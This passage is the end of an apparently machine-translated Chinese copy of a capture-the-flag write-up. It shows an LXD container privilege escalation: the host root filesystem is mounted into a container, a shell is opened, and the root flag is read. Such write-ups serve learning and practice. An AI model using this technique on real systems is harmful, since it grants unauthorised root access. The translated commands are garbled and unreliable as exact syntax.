paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oo"><img src="../Images/dad49118491a933a84060f9187f152c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*I9ZGuI8OVQJWfkow-2v0Eg.png"/></div></div></figure><p id="4e5d" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">现在我们已经创建了当前停止的计算机，我们需要为该计算机创建一个硬盘驱动器，因此我们将使用以下命令对其进行配置:</p><blockquote class="mz na nb"><p id="a0a6" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">lxc配置设备添加<machie_name>主机-根磁盘源=/路径=/mnt/根递归=真</machie_name></p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi op"><img src="../Images/2edc6abef9d481b08f1924e3b813666a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OR0kl0LS0ENAEEcnxz95FA.png"/></div></div></figure><p id="f8f3" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">现在我们已经为机器创建了一个硬盘，我们将启动机器。</p><blockquote class="mz na nb"><p id="12f7" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">lxc启动权限</p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oq"><img src="../Images/33c02ed27b9ba6c7e9c07655316f58dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1098/format:webp/1*m2ZqaRjydKzAD_a5VuvKkA.png"/></div></div></figure><p id="f24a" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">使用命令确认机器已经启动</p><blockquote class="mz na nb"><p id="b8ff" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">lxc列表</p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi or"><img src="../Images/80f10d2c4c0c52265b83e87f7c227bf8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-KJ9rGDo5y4doCcqwVtlEw.png"/></div></div></figure><p id="c923" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">它确实在运行。</p><p id="bfd1" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">目前为止做得很好！！让我们提升特权。祈祷吧。</p><blockquote class="mz na nb"><p id="ac2a" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">lxc执行<machine_name> /bin/sh</machine_name></p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div class="gh gi os"><img src="../Images/befb2de29bf6675daacff10edf2d31af.png" data-original-src="https://miro.medium.com/v2/resize:fit:1198/format:webp/1*Ns8ZetwA8uDVCIEGD3B1Jg.png"/></div></figure><p id="7f88" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们现在可以确认我们是根了。让我们夺取根旗，给这个游戏服务器一个美好的结局。</p><p id="1f1d" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">回想一下，当我们创建硬盘时，我们将源设置为/这是根文件系统，并将路径设置为/mnt/root。整个“根”文件系统位于/mnt/root中，因此我们将导航到/mnt/root目录</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ot"><img src="../Images/4c9757856b8c0ad38cdebeb9785f4e8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kjLdjsXNiwK4En3lz0qvjg.png"/></div></div></figure><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/223132fd803ff69826513472247fe5bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:992/format:webp/1*T8d2d7MX1YKpqSK0ljNyuw.png"/></div></figure><figure class="lz ma mb mc gt ju"><div class="bz fp l di"><div class="oa me l"/></div></figure><p id="d4fa" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">太棒了。！我们已经得到了根旗。提交吧。</p><blockquote class="mz na nb"><p id="fa19" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">#2.根旗是什么？<br/>答:XXXXXXXXXXXXXXXXXXXXXXX</p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/2dd125944887bba6e7c8c17f0b2129fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:614/format:webp/1*NteicGgFC2Pzwcajz9yQTw.png"/></div></figure><p id="fa4f" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们已经完成了房间。我真的很喜欢这个房间，并从中获得了很多乐趣。我会建议每个人都来这个房间试一试，我相信你会学到一些新的东西，特别是关于lxd权限提升方法。</p><p id="8ccd" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">如果你喜欢这篇文章，并且这篇文章对你有所帮助，请在评论中告诉我，或者用掌声分享你的爱。</p><figure class="lz ma mb mc gt ju"><div class="bz fp l di"><div class="ow me l"/></div></figure><p id="a1b7" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">谢谢你抽出时间。</p><p id="8332" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">跟着我。</p><p id="1aee" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">更多的报道正在进行中。</p><p id="87ce" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">保重，注意安全，继续黑！</p><p id="54c2" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated"><strong class="kh iu">-哈桑·谢赫</strong></p></div></div>    
</body>
</html>